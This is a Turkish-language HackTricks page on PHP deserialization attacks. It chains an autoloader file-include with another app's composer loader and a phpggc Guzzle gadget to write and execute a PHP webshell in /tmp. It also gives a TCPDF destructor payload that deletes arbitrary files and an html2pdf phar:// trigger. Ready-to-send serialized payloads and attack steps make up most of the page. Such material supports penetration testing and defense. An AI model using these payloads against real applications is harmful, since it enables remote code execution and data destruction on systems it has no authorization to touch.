# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Öncelikle, [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php)'ın ne olduğunu kontrol etmelisiniz.

## PHP deserialization + spl_autoload_register + LFI/Gadget

Durum şu: bir webapp'ta **PHP deserialization** bulduk ve mevcut uygulamada **phpggc** içinde gadget'lara açık hiçbir kütüphane yoktu. Ancak aynı container'da **farklı bir composer webapp** ve bu webapp'ta **vulnerable libraries** vardı. Bu yüzden amaç, diğer webapp'in **composer loader**'ını yükleyip bunu kullanarak, deserialization'a açık olan webapp'taki bir **gadget** ile o kütüphaneyi istismar edebilecek bir gadget'ı yüklemekti.

Steps:

- Bir **deserialization** buldunuz ve mevcut uygulama kodunda **hiç gadget yok**.
- Aşağıdaki gibi bir **`spl_autoload_register`** fonksiyonunu kötüye kullanarak **herhangi bir yerel `.php` uzantılı dosyayı yükleyebilirsiniz**.
- Bunun için sınıf adının **`$name`** içinde olacağı bir deserialization kullanırsınız. Serialized bir nesnede sınıf adında **"/"** veya **"."** kullanamazsınız, ancak **kod** alt çizgileri ("\_") **eğik çizgilere** ("/") **dönüştürüyor**. Bu yüzden `tmp_passwd` gibi bir sınıf adı `/tmp/passwd.php`'e dönüşecek ve kod onu yüklemeye çalışacaktır.\
Bir **gadget örneği**: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Eğer bir **dosya yükleme** (file upload) varsa ve **`.php` extension`lı** bir dosya yükleyebiliyorsanız, bu işlevi **doğrudan kullanarak** zaten RCE elde edebilirsiniz.

Benim durumumda böyle bir şey yoktu, ama aynı **container** içinde **phpggc** gadget'ına karşı savunmasız bir kütüphane içeren başka bir composer web sayfası vardı.

- Bu diğer kütüphaneyi yüklemek için önce o diğer web uygulamasının **composer loader**ını yüklemeniz gerekiyor (çünkü mevcut uygulamanınki diğerinin kütüphanelerine erişmez.) **Uygulamanın yolunu bilerek**, bunu çok kolayca şu ile başarabilirsiniz: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Benim durumumda, composer loader `/www/frontend/vendor/autoload.php` içindeydi)
- Şimdi, diğer uygulamanın **composer loader**ını **load** edebilirsiniz, bu yüzden kullanmak için **`phpggc`** **payload**ını **generate** etme zamanı. Benim durumumda **`Guzzle/FW1`** kullandım; bu bana **dosya sistemi içinde herhangi bir dosya yazma** imkanı verdi.
- NOT: Oluşturulan gadget **başlangıçta çalışmıyordu**, çalışması için `phpggc` payload'ındaki **`chain.php`** dosyasını **değiştirdim** ve sınıfların **tüm attribute**larını **private'dan public'e** çevirdim. Aksi takdirde, string deserialize edildikten sonra oluşturulan nesnelerin attribute'ları herhangi bir değere sahip olmuyordu.
- Artık diğer uygulamanın **composer loader**ını yükleme yolumuz ve çalışan bir **phpggc payload**ımız var, ama loader gadget kullanıldığında yüklenmesi için bunun **AYNI İSTEK** içinde yapılması gerekiyor. Bunun için, her iki objeyi de içeren serileştirilmiş bir array gönderdim, örneğin:
- İlk önce loader'ın yüklenip sonra payload'ın çalıştığını görebilirsiniz
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Şimdi, **bir dosya oluşturup yazabiliyoruz**, ancak kullanıcı **web sunucusu içindeki herhangi bir klasöre yazamıyordu**. Görüldüğü gibi payload içinde, PHP'nin **`system`** ile bazı **base64** çağrısı **`/tmp/a.php`** olarak oluşturuluyor. Ardından, oluşturulan **`/tmp/a.php`** dosyasını yüklemek için LFI olarak kullandığımız ilk türdeki **payload**'ı **yeniden kullanabiliriz** — diğer webapp'in composer loader'ını yüklemek için. Sadece bunu deserialization gadget'a ekleyin:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Payload özeti**

- **Aynı container içindeki farklı bir webapp'in composer autoload'unu yükle**
- **Bir phpggc gadget yükle** ve diğer webapp'in bir kütüphanesini suistimal et (deserialization'a karşı savunmasız olan başlangıç webapp'inin kütüphanelerinde hiçbir gadget yoktu)
- Gadget, zararlı komutlar içeren bir **PHP payload** dosyasını /tmp/a.php olarak oluşturacak (webapp kullanıcısı herhangi bir webapp klasörüne yazamıyor)
- Payload'ımızın son kısmı, komutları çalıştıracak şekilde **oluşturulan php dosyasını yükleyecek**

Bu **deserialization'ı iki kez çağırmam** gerekti. Testlerimde ilk sefer /tmp/a.php dosyası oluşturuldu fakat yüklenmedi; ikinci sefer ise doğru şekilde yüklendi.

## TCPDF `__destruct` POP chain ile keyfi dosya silme

Gerçek bir `TCPDF` örneği garbage-collected olduğunda `_destroy(true)` çağrılır, `$this->imagekeys` üzerinde döner ve `K_PATH_CACHE` altındaki cache dosyası gibi görünen her şeyi `unlink()` ile siler. Eğer bir uygulama `TCPDF` sınıfı yüklü iken `unserialize($user_data)` yapıyorsa (ör. `html` anahtarına sahip bir array bekliyorsa), şu şekilde ayarlanmış bir serialized object sağlayabilirsiniz:

- `file_id` değerini `self::$cleaned_ids` içinde olmayan herhangi bir integer yapın (örn. `-1`).
- `imagekeys` değerini `K_PATH_CACHE` ile başlayan veya öyleymiş gibi gösterilebilecek yollar olarak ayarlayın (örn. `K_PATH_CACHE` `/tmp/` ise `/tmp/../tmp/do_not_delete_this_file.txt`).

Güvensiz `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` akışını hedefleyen örnek payload:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Dosya, nesne kapsam dışına çıktığında hemen silinir. TCPDF 6.9.3 kontrolü sıkılaştırdı: yalnızca `K_PATH_CACHE` içindeki `__tcpdf_<file_id>_` önekiyle başlayan yolları kaldırıyor ve non-`file://` şemalarını engellemek için `_unlink()` ekledi; bu nedenle eski `Producer` sürümleri birincil hedeflerdir.

### html2pdf `<cert>` etiketlerindeki `phar://` ile gadget'ı tetikleme

`spipu/html2pdf` (≤5.3.0) TCPDF'yi sarar ve `src`/`privkey` öznitelikleri basit `file_exists()` ile doğrulanan özel bir `<cert>` bloğu sunar. PHP < 8.0 üzerinde `phar://` URL'sine dokunan herhangi bir dosya sistemi fonksiyonu Phar metadata'sının unserialize edilmesine neden olur. Zararlı TCPDF nesnesini bir Phar arşivinin metadata'sı içine koyarak, uygulama kendisi `unserialize()` çağırmasa bile güvenilir bir POP elde edersiniz.

1. `phar.readonly=0` ile bir Phar oluşturun, stub/manifest'i bir resim gibi gösterin (ör. `archive.phar`'ı `archive.png` olarak yeniden adlandırın) ve serialize edilmiş TCPDF nesnesini Phar metadata'sına koyun.
2. Dosyayı `/tmp/user_files/user_1/archive.png` gibi ulaşılabilir bir yere yükleyin/yerleştirin.
3. html2pdf'nin saldırgan kontrolündeki yolu çözümlemesi için `<cert>` etiketi içeren HTML gönderin:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` çağrısı metadata'yı ters serileştirir, TCPDF'yi örnekler ve yıkıcı (destructor) seçilen dosyayı siler; bu da html2pdf'yi güçlü bir `phar://` giriş noktası haline getirir. Sürüm 5.3.1 onaylanmamış şemaları engellemek için `Security::checkValidPath()` ekledi; bu yüzden eski dağıtımlar hâlâ cazip.

## Referanslar

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
